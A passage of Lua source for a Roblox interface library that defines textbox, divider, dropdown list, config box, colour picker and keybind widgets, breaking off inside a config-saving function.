            library.options[args.flag] = {type = "slider",changeState = updateValue,skipflag = args.skipflag,oldargs = args}
            updateValue(args.value or 0)
        end
        function group:addTextbox(args)
            groupbox.Size += UDim2.new(0, 0, 0, 35)

            local textbox = Instance.new("Frame")
            local bg = Instance.new("Frame")
            local main = Instance.new("ScrollingFrame")
            local box = Instance.new("TextBox")
            local gradient = Instance.new("UIGradient")
            local text = Instance.new("TextLabel")

            box:GetPropertyChangedSignal('Text'):Connect(function(val)
                if library.colorpicking then return end
                library.flags[args.flag] = box.Text
                args.value = box.Text
                if args.callback then
                    args.callback()
                end
            end)
            textbox.Name = "textbox"
            textbox.Parent = grouper
            textbox.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            textbox.BackgroundTransparency = 1.000
            textbox.BorderSizePixel = 0
            textbox.Size = UDim2.new(1, 0, 0, 35)
            textbox.ZIndex = 10

            bg.Name = "bg"
            bg.Parent = textbox
            bg.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
            bg.BorderColor3 = Color3.fromRGB(0, 0, 0)
            bg.BorderSizePixel = 2
            bg.Position = UDim2.new(0.0299999993, -1, 0, 16)
            bg.Size = UDim2.new(0, 205, 0, 15)

            main.Name = "main"
            main.Parent = bg
            main.Active = true
            main.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
            main.BorderColor3 = Color3.fromRGB(60, 60, 60)
            main.Size = UDim2.new(1, 0, 1, 0)
            main.CanvasSize = UDim2.new(0, 0, 0, 0)
            main.ScrollBarThickness = 0

            box.Name = "box"
            box.Parent = main
            box.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            box.BackgroundTransparency = 1.000
            box.Selectable = false
            box.Size = UDim2.new(1, 0, 1, 0)
            box.Font = Enum.Font.Code
            box.Text = args.value or ""
            box.TextColor3 = Color3.fromRGB(255, 255, 255)
            box.TextSize = 13.000
            box.TextStrokeTransparency = 0.000
            box.TextXAlignment = Enum.TextXAlignment.Left

            gradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(255, 255, 255)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(171, 171, 171))}
            gradient.Rotation = 90
            gradient.Name = "gradient"
            gradient.Parent = main

            text.Name = "text"
            text.Parent = textbox
            text.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            text.BackgroundTransparency = 1.000
            text.Position = UDim2.new(0.0299999993, -1, 0, 7)
            text.ZIndex = 2
            text.Font = Enum.Font.Code
            text.Text = args.text or args.flag
            text.TextColor3 = Color3.fromRGB(244, 244, 244)
            text.TextSize = 13.000
            text.TextStrokeTransparency = 0.000
            text.TextXAlignment = Enum.TextXAlignment.Left


            library.flags[args.flag] = args.value or ""
            library.options[args.flag] = {type = "textbox",changeState = function(text) box.Text = text end,skipflag = args.skipflag,oldargs = args}
        end
        function group:addDivider(args)
            groupbox.Size += UDim2.new(0, 0, 0, 10)
            
            local div = Instance.new("Frame")
            local bg = Instance.new("Frame")
            local main = Instance.new("Frame")

            div.Name = "div"
            div.Parent = grouper
            div.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            div.BackgroundTransparency = 1.000
            div.BorderSizePixel = 0
            div.Position = UDim2.new(0, 0, 0.743662, 0)
            div.Size = UDim2.new(0, 202, 0, 10)
            
            bg.Name = "bg"
            bg.Parent = div
            bg.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
            bg.BorderColor3 = Color3.fromRGB(0, 0, 0)
            bg.BorderSizePixel = 2
            bg.Position = UDim2.new(0.0240000002, 0, 0, 4)
            bg.Size = UDim2.new(0, 191, 0, 1)
            
            main.Name = "main"
            main.Parent = bg
            main.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
            main.BorderColor3 = Color3.fromRGB(60, 60, 60)
            main.Size = UDim2.new(0, 191, 0, 1)
        end
        function group:addList(args)
            if not args.flag or not args.values then return warn("⚠️ incorrect arguments ⚠️") end
            groupbox.Size += UDim2.new(0, 0, 0, 35)
            
--args.multiselect and "..." or ""
            library.multiZindex -= 1

            local list = Instance.new("Frame")
            local bg = Instance.new("Frame")
            local main = Instance.new("ScrollingFrame")
            local button = Instance.new("TextButton")
            local dumbtriangle = Instance.new("ImageLabel")
            local valuetext = Instance.new("TextLabel")
            local gradient = Instance.new("UIGradient")
            local text = Instance.new("TextLabel")

            local frame = Instance.new("Frame")
            local holder = Instance.new("Frame")
            local UIListLayout = Instance.new("UIListLayout")
            
            list.Name = "list"
            list.Parent = grouper
            list.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            list.BackgroundTransparency = 1.000
            list.BorderSizePixel = 0
            list.Size = UDim2.new(1, 0, 0, 35)
            list.ZIndex = library.multiZindex

            bg.Name = "bg"
            bg.Parent = list
            bg.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
            bg.BorderColor3 = Color3.fromRGB(0, 0, 0)
            bg.BorderSizePixel = 2
            bg.Position = UDim2.new(0.0299999993, -1, 0, 16)
            bg.Size = UDim2.new(0, 205, 0, 15)

            main.Name = "main"
            main.Parent = bg
            main.Active = true
            main.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
            main.BorderColor3 = Color3.fromRGB(60, 60, 60)
            main.Size = UDim2.new(1, 0, 1, 0)
            main.CanvasSize = UDim2.new(0, 0, 0, 0)
            main.ScrollBarThickness = 0

            button.Name = "button"
            button.Parent = main
            button.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            button.BackgroundTransparency = 1.000
            button.Size = UDim2.new(0, 191, 1, 0)
            button.Font = Enum.Font.SourceSans
            button.Text = ""
            button.TextColor3 = Color3.fromRGB(0, 0, 0)
            button.TextSize = 14.000

            dumbtriangle.Name = "dumbtriangle"
            dumbtriangle.Parent = main
            dumbtriangle.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
            dumbtriangle.BackgroundTransparency = 1.000
            dumbtriangle.BorderColor3 = Color3.fromRGB(0, 0, 0)
            dumbtriangle.BorderSizePixel = 0
            dumbtriangle.Position = UDim2.new(1, -11, 0.5, -3)
            dumbtriangle.Size = UDim2.new(0, 7, 0, 6)
            dumbtriangle.ZIndex = 3
            dumbtriangle.Image = "rbxassetid://8532000591"

            valuetext.Name = "valuetext"
            valuetext.Parent = main
            valuetext.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            valuetext.BackgroundTransparency = 1.000
            valuetext.Position = UDim2.new(0.00200000009, 2, 0, 7)
            valuetext.ZIndex = 2
            valuetext.Font = Enum.Font.Code
            valuetext.Text = ""
            valuetext.TextColor3 = Color3.fromRGB(244, 244, 244)
            valuetext.TextSize = 13.000
            valuetext.TextStrokeTransparency = 0.000
            valuetext.TextXAlignment = Enum.TextXAlignment.Left

            gradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(255, 255, 255)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(171, 171, 171))}
            gradient.Rotation = 90
            gradient.Name = "gradient"
            gradient.Parent = main

            text.Name = "text"
            text.Parent = list
            text.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            text.BackgroundTransparency = 1.000
            text.Position = UDim2.new(0.0299999993, -1, 0, 7)
            text.ZIndex = 2
            text.Font = Enum.Font.Code
            text.Text = args.text or args.flag
            text.TextColor3 = Color3.fromRGB(244, 244, 244)
            text.TextSize = 13.000
            text.TextStrokeTransparency = 0.000
            text.TextXAlignment = Enum.TextXAlignment.Left

            frame.Name = "frame"
            frame.Parent = list
            frame.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
            frame.BorderColor3 = Color3.fromRGB(0, 0, 0)
            frame.BorderSizePixel = 2
            frame.Position = UDim2.new(0.0299999993, -1, 0.605000019, 15)
            frame.Size = UDim2.new(0, 203, 0, 0)
            frame.Visible = false
            frame.ZIndex = library.multiZindex
            
            holder.Name = "holder"
            holder.Parent = frame
            holder.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
            holder.BorderColor3 = Color3.fromRGB(60, 60, 60)
            holder.Size = UDim2.new(1, 0, 1, 0)
            
            UIListLayout.Parent = holder
            UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder

			local function updateValue(value)
                if value == nil then valuetext.Text = "nil" return end
				if args.multiselect then
                    if type(value) == "string" then
                        if not table.find(library.options[args.flag].values,value) then return end
                        if table.find(library.flags[args.flag],value) then
                            for i,v in pairs(library.flags[args.flag]) do
                                if v == value then
                                    table.remove(library.flags[args.flag],i)
                                end
                            end
                        else
                            table.insert(library.flags[args.flag],value)
                        end
                    else
                        library.flags[args.flag] = value
                    end
					local buttonText = ""
					for i,v in pairs(library.flags[args.flag]) do
						local jig = i ~= #library.flags[args.flag] and "," or ""
						buttonText = buttonText..v..jig
					end
                    if buttonText == "" then buttonText = "..." end
					for i,v in next, holder:GetChildren() do
						if v.ClassName ~= "Frame" then continue end
						v.off.TextColor3 = Color3.new(0.65,0.65,0.65)
						for _i,_v in next, library.flags[args.flag] do
							if v.Name == _v then
								v.off.TextColor3 = Color3.new(1,1,1)
							end
						end
					end
					valuetext.Text = buttonText
					if args.callback then
						args.callback(library.flags[args.flag])
					end
				else
                    if not table.find(library.options[args.flag].values,value) then value = library.options[args.flag].values[1] end
                    library.flags[args.flag] = value
					for i,v in next, holder:GetChildren() do
						if v.ClassName ~= "Frame" then continue end
						v.off.TextColor3 = Color3.new(0.65,0.65,0.65)
                        if v.Name == library.flags[args.flag] then
                            v.off.TextColor3 = Color3.new(1,1,1)
                        end
					end
					frame.Visible = false
                    if library.flags[args.flag] then
                        valuetext.Text = library.flags[args.flag]
                        if args.callback then
                            args.callback(library.flags[args.flag])
                        end
                    end
				end
			end

            function refresh(tbl)
                for i,v in next, holder:GetChildren() do
                    if v.ClassName == "Frame" then
                        v:Destroy()
                    end
					frame.Size = UDim2.new(0, 203, 0, 0)
                end
                for i,v in pairs(tbl) do
                    frame.Size += UDim2.new(0, 0, 0, 20)

                    local option = Instance.new("Frame")
                    local button_2 = Instance.new("TextButton")
                    local text_2 = Instance.new("TextLabel")

                    option.Name = v
                    option.Parent = holder
                    option.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
                    option.BackgroundTransparency = 1.000
                    option.Size = UDim2.new(1, 0, 0, 20)

                    button_2.Name = "button"
                    button_2.Parent = option
                    button_2.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
                    button_2.BackgroundTransparency = 0.850
                    button_2.BorderSizePixel = 0
                    button_2.Size = UDim2.new(1, 0, 1, 0)
                    button_2.Font = Enum.Font.SourceSans
                    button_2.Text = ""
                    button_2.TextColor3 = Color3.fromRGB(0, 0, 0)
                    button_2.TextSize = 14.000

                    text_2.Name = "off"
                    text_2.Parent = option
                    text_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
                    text_2.BackgroundTransparency = 1.000
                    text_2.Position = UDim2.new(0, 4, 0, 0)
                    text_2.Size = UDim2.new(0, 0, 1, 0)
                    text_2.Font = Enum.Font.Code
                    text_2.Text = v
                    text_2.TextColor3 = args.multiselect and Color3.new(0.65,0.65,0.65) or Color3.new(1,1,1)
                    text_2.TextSize = 14.000
                    text_2.TextStrokeTransparency = 0.000
                    text_2.TextXAlignment = Enum.TextXAlignment.Left
    
                    button_2.MouseButton1Click:Connect(function()
                        updateValue(v)
                    end)
                end
                library.options[args.flag].values = tbl
                updateValue(table.find(library.options[args.flag].values,library.flags[args.flag]) and library.flags[args.flag] or library.options[args.flag].values[1])
            end

            button.MouseButton1Click:Connect(function()
                if not library.colorpicking then
                    frame.Visible = not frame.Visible
                end
            end)
            button.MouseEnter:connect(function()
                main.BorderColor3 = library.libColor
			end)
			button.MouseLeave:connect(function()
                main.BorderColor3 = Color3.fromRGB(60, 60, 60)
			end)
            
            table.insert(library.toInvis,frame)
            library.flags[args.flag] = args.multiselect and {} or ""
            library.options[args.flag] = {type = "list",changeState = updateValue,values = args.values,refresh = refresh,skipflag = args.skipflag,oldargs = args}

            refresh(args.values)
            updateValue(args.value or not args.multiselect and args.values[1] or "abcdefghijklmnopqrstuwvxyz")
        end
        function group:addConfigbox(args)
            groupbox.Size += UDim2.new(0, 0, 0, 138)
            library.multiZindex -= 1
            
            local list2 = Instance.new("Frame")
            local frame = Instance.new("Frame")
            local main = Instance.new("Frame")
            local holder = Instance.new("ScrollingFrame")
            local UIListLayout = Instance.new("UIListLayout")
            local dwn = Instance.new("ImageLabel")
            local up = Instance.new("ImageLabel")
        
            list2.Name = "list2"
            list2.Parent = grouper
            list2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            list2.BackgroundTransparency = 1.000
            list2.BorderSizePixel = 0
            list2.Position = UDim2.new(0, 0, 0.108108111, 0)
            list2.Size = UDim2.new(1, 0, 0, 138)
            
            frame.Name = "frame"
            frame.Parent = list2
            frame.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
            frame.BorderColor3 = Color3.fromRGB(0, 0, 0)
            frame.BorderSizePixel = 2
            frame.Position = UDim2.new(0.0299999993, -1, 0.0439999998, 0)
            frame.Size = UDim2.new(0, 205, 0, 128)
            
            main.Name = "main"
            main.Parent = frame
            main.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
            main.BorderColor3 = Color3.fromRGB(60, 60, 60)
            main.Size = UDim2.new(1, 0, 1, 0)
            
            holder.Name = "holder"
            holder.Parent = main
            holder.Active = true
            holder.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            holder.BackgroundTransparency = 1.000
            holder.BorderSizePixel = 0
            holder.Position = UDim2.new(0, 0, 0.00571428565, 0)
            holder.Size = UDim2.new(1, 0, 1, 0)
            holder.BottomImage = "rbxasset://textures/ui/Scroll/scroll-middle.png"
            holder.CanvasSize = UDim2.new(0, 0, 0, 0)
            holder.ScrollBarThickness = 0
            holder.TopImage = "rbxasset://textures/ui/Scroll/scroll-middle.png"
            holder.AutomaticCanvasSize = Enum.AutomaticSize.Y
            holder.ScrollingEnabled = true
            holder.ScrollBarImageTransparency = 0
            
            UIListLayout.Parent = holder
            
            dwn.Name = "dwn"
            dwn.Parent = frame
            dwn.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
            dwn.BackgroundTransparency = 1.000
            dwn.BorderColor3 = Color3.fromRGB(0, 0, 0)
            dwn.BorderSizePixel = 0
            dwn.Position = UDim2.new(0.930000007, 4, 1, -9)
            dwn.Size = UDim2.new(0, 7, 0, 6)
            dwn.ZIndex = 3
            dwn.Image = "rbxassetid://8548723563"
            dwn.Visible = false
            
            up.Name = "up"
            up.Parent = frame
            up.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
            up.BackgroundTransparency = 1.000
            up.BorderColor3 = Color3.fromRGB(0, 0, 0)
            up.BorderSizePixel = 0
            up.Position = UDim2.new(0, 3, 0, 3)
            up.Size = UDim2.new(0, 7, 0, 6)
            up.ZIndex = 3
            up.Image = "rbxassetid://8548757311"
            up.Visible = false

            local function updateValue(value)
                if value == nil then return end
                if not table.find(library.options[args.flag].values,value) then value = library.options[args.flag].values[1] end
                library.flags[args.flag] = value
        
                for i,v in next, holder:GetChildren() do
                    if v.ClassName ~= "Frame" then continue end
                    if v.text.Text == library.flags[args.flag] then
                        v.text.TextColor3 = library.libColor
                    else
                        v.text.TextColor3 = Color3.fromRGB(255,255,255)
                    end
                end
                if library.flags[args.flag] then
                    if args.callback then
                        args.callback(library.flags[args.flag])
                    end
                end
                holder.Visible = true
            end
            holder:GetPropertyChangedSignal("CanvasPosition"):Connect(function()
                up.Visible = (holder.CanvasPosition.Y > 1)
                dwn.Visible = (holder.CanvasPosition.Y + 1 < (holder.AbsoluteCanvasSize.Y - holder.AbsoluteSize.Y))
            end)
        
        
            function refresh(tbl)
                for i,v in next, holder:GetChildren() do
                    if v.ClassName == "Frame" then
                        v:Destroy()
                    end
                end
                for i,v in pairs(tbl) do
                    local item = Instance.new("Frame")
                    local button = Instance.new("TextButton")
                    local text = Instance.new("TextLabel")
        
                    item.Name = v
                    item.Parent = holder
                    item.Active = true
                    item.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
                    item.BackgroundTransparency = 1.000
                    item.BorderColor3 = Color3.fromRGB(0, 0, 0)
                    item.BorderSizePixel = 0
                    item.Size = UDim2.new(1, 0, 0, 18)
                    
                    button.Parent = item
                    button.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
                    button.BackgroundTransparency = 1
                    button.BorderColor3 = Color3.fromRGB(0, 0, 0)
                    button.BorderSizePixel = 0
                    button.Size = UDim2.new(1, 0, 1, 0)
                    button.Text = ""
                    button.TextTransparency = 1.000
                    
                    text.Name = 'text'
                    text.Parent = item
                    text.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
                    text.BackgroundTransparency = 1.000
                    text.Size = UDim2.new(1, 0, 0, 18)
                    text.Font = Enum.Font.Code
                    text.Text = v
                    text.TextColor3 = Color3.fromRGB(255, 255, 255)
                    text.TextSize = 14.000
                    text.TextStrokeTransparency = 0.000
        
                    button.MouseButton1Click:Connect(function()
                        updateValue(v)
                    end)
                end
        
                holder.Visible = true
                library.options[args.flag].values = tbl
                updateValue(table.find(library.options[args.flag].values,library.flags[args.flag]) and library.flags[args.flag] or library.options[args.flag].values[1])
            end
        
        
            library.flags[args.flag] = ""
            library.options[args.flag] = {type = "cfg",changeState = updateValue,values = args.values,refresh = refresh,skipflag = args.skipflag,oldargs = args}
        
            refresh(args.values)
            updateValue(args.value or not args.multiselect and args.values[1] or "abcdefghijklmnopqrstuwvxyz")
        end
        function group:addColorpicker(args)
            if not args.flag then return warn("⚠️ incorrect arguments ⚠️") end
            groupbox.Size += UDim2.new(0, 0, 0, 20)
        
            library.multiZindex -= 1
            jigCount -= 1
            topStuff -= 1

            local colorpicker = Instance.new("Frame")
            local back = Instance.new("Frame")
            local mid = Instance.new("Frame")
            local front = Instance.new("Frame")
            local text = Instance.new("TextLabel")
            local colorpicker_2 = Instance.new("Frame")
            local button = Instance.new("TextButton")

            local colorFrame = Instance.new("Frame")
			local colorFrame_2 = Instance.new("Frame")
			local hueframe = Instance.new("Frame")
			local main = Instance.new("Frame")
			local hue = Instance.new("ImageLabel")
			local pickerframe = Instance.new("Frame")
			local main_2 = Instance.new("Frame")
			local picker = Instance.new("ImageLabel")
			local clr = Instance.new("Frame")
			local copy = Instance.new("TextButton")

            colorpicker.Name = "colorpicker"
            colorpicker.Parent = grouper
            colorpicker.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            colorpicker.BackgroundTransparency = 1.000
            colorpicker.BorderSizePixel = 0
            colorpicker.Size = UDim2.new(1, 0, 0, 20)
            colorpicker.ZIndex = topStuff

            text.Name = "text"
            text.Parent = colorpicker
            text.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            text.BackgroundTransparency = 1.000
            text.Position = UDim2.new(0.0299999993, -1, 0, 10)
            text.Font = Enum.Font.Code
            text.Text = args.text or args.flag
            text.TextColor3 = Color3.fromRGB(244, 244, 244)
            text.TextSize = 13.000
            text.TextStrokeTransparency = 0.000
            text.TextXAlignment = Enum.TextXAlignment.Left

            button.Name = "button"
            button.Parent = colorpicker
            button.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            button.BackgroundTransparency = 1.000
            button.BorderSizePixel = 0
            button.Size = UDim2.new(1, 0, 1, 0)
            button.Font = Enum.Font.SourceSans
            button.Text = ""
            button.TextColor3 = Color3.fromRGB(0, 0, 0)
            button.TextSize = 14.000

            colorpicker_2.Name = "colorpicker"
            colorpicker_2.Parent = colorpicker
            colorpicker_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            colorpicker_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
            colorpicker_2.BorderSizePixel = 3
            colorpicker_2.Position = UDim2.new(0.860000014, 4, 0.272000015, 0)
            colorpicker_2.Size = UDim2.new(0, 20, 0, 10)

            mid.Name = "mid"
            mid.Parent = colorpicker_2
            mid.BackgroundColor3 = Color3.fromRGB(69, 23, 255)
            mid.BorderColor3 = Color3.fromRGB(60, 60, 60)
            mid.BorderSizePixel = 2
            mid.Size = UDim2.new(1, 0, 1, 0)

            front.Name = "front"
            front.Parent = mid
            front.BackgroundColor3 = Color3.fromRGB(240, 142, 214)
            front.BorderColor3 = Color3.fromRGB(0, 0, 0)
            front.Size = UDim2.new(1, 0, 1, 0)

            button.Name = "button"
            button.Parent = colorpicker
            button.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            button.BackgroundTransparency = 1.000
            button.Size = UDim2.new(0, 202, 0, 22)
            button.Font = Enum.Font.SourceSans
            button.Text = ""
			button.ZIndex = args.ontop and topStuff or jigCount
            button.TextColor3 = Color3.fromRGB(0, 0, 0)
            button.TextSize = 14.000

			colorFrame.Name = "colorFrame"
			colorFrame.Parent = colorpicker
			colorFrame.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
			colorFrame.BorderColor3 = Color3.fromRGB(0, 0, 0)
			colorFrame.BorderSizePixel = 2
			colorFrame.Position = UDim2.new(0.101092957, 0, 0.75, 0)
			colorFrame.Size = UDim2.new(0, 137, 0, 128)

			colorFrame_2.Name = "colorFrame"
			colorFrame_2.Parent = colorFrame
			colorFrame_2.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
			colorFrame_2.BorderColor3 = Color3.fromRGB(60, 60, 60)
			colorFrame_2.Size = UDim2.new(1, 0, 1, 0)

			hueframe.Name = "hueframe"
			hueframe.Parent = colorFrame_2
            hueframe.BackgroundColor3 = Color3.fromRGB(34, 34, 34)
            hueframe.BorderColor3 = Color3.fromRGB(60, 60, 60)
            hueframe.BorderSizePixel = 2
            hueframe.Position = UDim2.new(-0.0930000022, 18, -0.0599999987, 30)
            hueframe.Size = UDim2.new(0, 100, 0, 100)

            main.Name = "main"
            main.Parent = hueframe
            main.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
            main.BorderColor3 = Color3.fromRGB(0, 0, 0)
            main.Size = UDim2.new(0, 100, 0, 100)
            main.ZIndex = 6

            picker.Name = "picker"
            picker.Parent = main
            picker.BackgroundColor3 = Color3.fromRGB(232, 0, 255)
            picker.BorderColor3 = Color3.fromRGB(0, 0, 0)
            picker.BorderSizePixel = 0
            picker.Size = UDim2.new(0, 100, 0, 100)
            picker.ZIndex = 104
            picker.Image = "rbxassetid://2615689005"

            pickerframe.Name = "pickerframe"
            pickerframe.Parent = colorFrame
            pickerframe.BackgroundColor3 = Color3.fromRGB(34, 34, 34)
            pickerframe.BorderColor3 = Color3.fromRGB(60, 60, 60)
            pickerframe.BorderSizePixel = 2
            pickerframe.Position = UDim2.new(0.711000025, 14, -0.0599999987, 30)
            pickerframe.Size = UDim2.new(0, 20, 0, 100)

            main_2.Name = "main"
            main_2.Parent = pickerframe
            main_2.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
            main_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
            main_2.Size = UDim2.new(0, 20, 0, 100)
            main_2.ZIndex = 6

            hue.Name = "hue"
            hue.Parent = main_2
            hue.BackgroundColor3 = Color3.fromRGB(255, 0, 178)
            hue.BorderColor3 = Color3.fromRGB(0, 0, 0)
            hue.BorderSizePixel = 0
            hue.Size = UDim2.new(0, 20, 0, 100)
            hue.ZIndex = 104
            hue.Image = "rbxassetid://2615692420"

            clr.Name = "clr"
            clr.Parent = colorFrame
            clr.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
            clr.BackgroundTransparency = 1.000
            clr.BorderColor3 = Color3.fromRGB(60, 60, 60)
            clr.BorderSizePixel = 2
            clr.Position = UDim2.new(0.0280000009, 0, 0, 2)
            clr.Size = UDim2.new(0, 129, 0, 14)
            clr.ZIndex = 5

            copy.Name = "copy"
            copy.Parent = clr
            copy.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
            copy.BackgroundTransparency = 1.000
            copy.BorderSizePixel = 0
            copy.Size = UDim2.new(0, 129, 0, 14)
            copy.ZIndex = 5
            copy.Font = Enum.Font.SourceSans
            copy.Text = args.text or args.flag
            copy.TextColor3 = Color3.fromRGB(100, 100, 100)
            copy.TextSize = 14.000
            copy.TextStrokeTransparency = 0.000
            
            copy.MouseButton1Click:Connect(function()
                colorFrame.Visible = false
            end)

            button.MouseButton1Click:Connect(function()
				colorFrame.Visible = not colorFrame.Visible
                mid.BorderColor3 = Color3.fromRGB(60, 60, 60)
            end)

            button.MouseEnter:connect(function()
                mid.BorderColor3 = library.libColor
            end)
            button.MouseLeave:connect(function()
                mid.BorderColor3 = Color3.fromRGB(60, 60, 60)
            end)

            local function updateValue(value,fakevalue)
                if typeof(value) == "table" then value = fakevalue end
                library.flags[args.flag] = value
                front.BackgroundColor3 = value
                if args.callback then
                    args.callback(value)
                end
			end

            local white, black = Color3.new(1,1,1), Color3.new(0,0,0)
            local colors = {Color3.new(1,0,0),Color3.new(1,1,0),Color3.new(0,1,0),Color3.new(0,1,1),Color3.new(0,0,1),Color3.new(1,0,1),Color3.new(1,0,0)}
            local heartbeat = game:GetService("RunService").Heartbeat

            local pickerX,pickerY,hueY = 0,0,0
            local oldpercentX,oldpercentY = 0,0

            hue.MouseEnter:Connect(function()
                local input = hue.InputBegan:connect(function(key)
                    if key.UserInputType == Enum.UserInputType.MouseButton1 then
                        while heartbeat:wait() and inputService:IsMouseButtonPressed(Enum.UserInputType.MouseButton1) do
                            library.colorpicking = true
                            local percent = (hueY-hue.AbsolutePosition.Y-36)/hue.AbsoluteSize.Y
                            local num = math.max(1, math.min(7,math.floor(((percent*7+0.5)*100))/100))
                            local startC = colors[math.floor(num)]
                            local endC = colors[math.ceil(num)]
                            local color = white:lerp(picker.BackgroundColor3, oldpercentX):lerp(black, oldpercentY)
                            picker.BackgroundColor3 = startC:lerp(endC, num-math.floor(num)) or Color3.new(0, 0, 0)
                            updateValue(color)
                        end
                        library.colorpicking = false
                    end
                end)
                local leave
                leave = hue.MouseLeave:connect(function()
                    input:disconnect()
                    leave:disconnect()
                end)
            end)

            picker.MouseEnter:Connect(function()
                local input = picker.InputBegan:connect(function(key)
                    if key.UserInputType == Enum.UserInputType.MouseButton1 then
                        while heartbeat:wait() and inputService:IsMouseButtonPressed(Enum.UserInputType.MouseButton1) do
                            library.colorpicking = true
                            local xPercent = (pickerX-picker.AbsolutePosition.X)/picker.AbsoluteSize.X
                            local yPercent = (pickerY-picker.AbsolutePosition.Y-36)/picker.AbsoluteSize.Y
                            local color = white:lerp(picker.BackgroundColor3, xPercent):lerp(black, yPercent)
                            updateValue(color)
                            oldpercentX,oldpercentY = xPercent,yPercent
                        end
                        library.colorpicking = false
                    end
                end)
                local leave
                leave = picker.MouseLeave:connect(function()
                    input:disconnect()
                    leave:disconnect()
                end)
            end)

            hue.MouseMoved:connect(function(_, y)
                hueY = y
            end)

            picker.MouseMoved:connect(function(x, y)
                pickerX,pickerY = x,y
            end)

            table.insert(library.toInvis,colorFrame)
            library.flags[args.flag] = Color3.new(1,1,1)
            library.options[args.flag] = {type = "colorpicker",changeState = updateValue,skipflag = args.skipflag,oldargs = args}

            updateValue(args.color or Color3.new(1,1,1))
        end
        function group:addKeybind(args)
            if not args.flag then return warn("⚠️ incorrect arguments ⚠️ - missing args on toggle:keybind") end
            groupbox.Size += UDim2.new(0, 0, 0, 20)
            local next = false
            
            local keybind = Instance.new("Frame")
            local text = Instance.new("TextLabel")
            local button = Instance.new("TextButton")

            keybind.Parent = grouper
            keybind.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            keybind.BackgroundTransparency = 1.000
            keybind.BorderSizePixel = 0
            keybind.Size = UDim2.new(1, 0, 0, 20)
            
            text.Parent = keybind
            text.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            text.BackgroundTransparency = 1.000
            text.Position = UDim2.new(0.0299999993, -1, 0, 10)
            text.Font = Enum.Font.Code
            text.Text = args.text or args.flag
            text.TextColor3 = Color3.fromRGB(244, 244, 244)
            text.TextSize = 13.000
            text.TextStrokeTransparency = 0.000
            text.TextXAlignment = Enum.TextXAlignment.Left
            
            button.Parent = keybind
            button.BackgroundColor3 = Color3.fromRGB(187, 131, 255)
            button.BackgroundTransparency = 1.000
            button.BorderSizePixel = 0
            button.Position = UDim2.new(7.09711117e-08, 0, 0, 0)
            button.Size = UDim2.new(0.978837132, 0, 1, 0)
            button.Font = Enum.Font.Code
            button.Text = "--"
            button.TextColor3 = Color3.fromRGB(155, 155, 155)
            button.TextSize = 13.000
            button.TextStrokeTransparency = 0.000
            button.TextXAlignment = Enum.TextXAlignment.Right

            function updateValue(val)
                if library.colorpicking then return end
                library.flags[args.flag] = val
                button.Text = keyNames[val] or val.Name
            end
            inputService.InputBegan:Connect(function(key)
                local key = key.KeyCode == Enum.KeyCode.Unknown and key.UserInputType or key.KeyCode
                if next then
                    if not table.find(library.blacklisted,key) then
                        next = false
                        library.flags[args.flag] = key
                        button.Text = keyNames[key] or key.Name
                        button.TextColor3 = Color3.fromRGB(155, 155, 155)
                    end
                end
                if not next and key == library.flags[args.flag] and args.callback then
                    args.callback()
                end
            end)

            button.MouseButton1Click:Connect(function()
                if library.colorpicking then return end
                library.flags[args.flag] = Enum.KeyCode.Unknown
                button.Text = "..."
                button.TextColor3 = Color3.new(0.2,0.2,0.2)
                next = true
            end)

            library.flags[args.flag] = Enum.KeyCode.Unknown
            library.options[args.flag] = {type = "keybind",changeState = updateValue,skipflag = args.skipflag,oldargs = args}

            updateValue(args.key or Enum.KeyCode.Unknown)
        end
        return group, groupbox
    end
    return tab
end

function contains(list, x)
	for _, v in pairs(list) do
		if v == x then return true end
	end
	return false
end

function library:createConfig()
    local name = library.flags["config_name"]
    if contains(library.options["selected_config"].values, name) then return library:notify(name..".cfg already exists!") end
    if name == "" then return library:notify("Put a name goofy") end
    local jig = {}
    for i,v in next, library.flags do
        if library.options[i].skipflag then continue end
        if typeof(v) == "Color3" then
